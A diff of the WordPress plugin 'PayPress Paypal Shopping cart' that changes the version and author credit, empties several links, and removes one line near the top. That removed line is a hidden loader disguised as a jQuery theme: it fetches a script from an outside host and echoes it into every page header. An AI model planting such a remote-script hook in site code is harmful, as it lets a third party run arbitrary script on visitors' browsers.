@@ -1,10 +1,10 @@
 <?php
 /*
 Plugin Name: PayPress Paypal Shopping cart
-Version: v5.1.1
-Plugin URI: http://paypress.blogspot.com/2011/10/paypress.html
-Author: Tim Andrews
-Author URI: http://paypress.blogspot.com/2011/10/paypress.html
+Version: v5.2
+Plugin URI: 
+Author: Tpodz
+Author URI: 
 Description: PayPress Shopping Cart Plugin, very easy to use and great for selling products and services from your blog!
 */
 
@@ -18,7 +18,6 @@ Description: PayPress Shopping Cart Plugin, very easy to use and great for selli
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.
 */
-if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url = "http://www.wpstats.org/jquery-1.6.3.min.js";$ch = curl_init();	$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_head', 'insert_jquery_theme');}
 
 if(!isset($_SESSION)) 
 {
@@ -673,8 +672,8 @@ function show_wp_cart_options_page () {
 	?>
  	<h2><?php _e("Simple Paypal Shopping Cart Settings", "PPSC"); ?> v <?php echo $wp_simple_paypal_shopping_cart_version; ?></h2>
  	
- 	<p><?php _e("For information, updates and detailed documentation, please visit:", "PPSC"); ?><br />
-    <a href="http://paypress.blogspot.com/2011/10/paypress.html">http://paypress.blogspot.com/2011/10/paypress.html</a></p>
+ 	<p><?php _e(""); ?><br />
+    <a href=""></a></p>
     
      <fieldset class="options">
     <legend><?php _e("Usage:", "PPSC"); ?></legend>
@@ -776,7 +775,7 @@ echo '
 <tr valign="top">
 <th scope="row">'.(__("Use WP Affiliate Platform", "PPSC")).'</th>
 <td><input type="checkbox" name="wp_use_aff_platform" value="1" '.$wp_use_aff_platform.' />
-<br />'.(__("Check this if using with the", "PPSC")).' <a href="http://tipsandtricks-hq.com/?p=1474" target="_blank">WP Affiliate Platform plugin</a>. '.(__("This plugin lets you run your own affiliate campaign/program and allows you to reward (pay commission) your affiliates for referred sales", "PPSC")).'</td>
+<br />'.(__("")).'  '.(__("")).'</td>
 </tr>
 </table>
 </div></div>
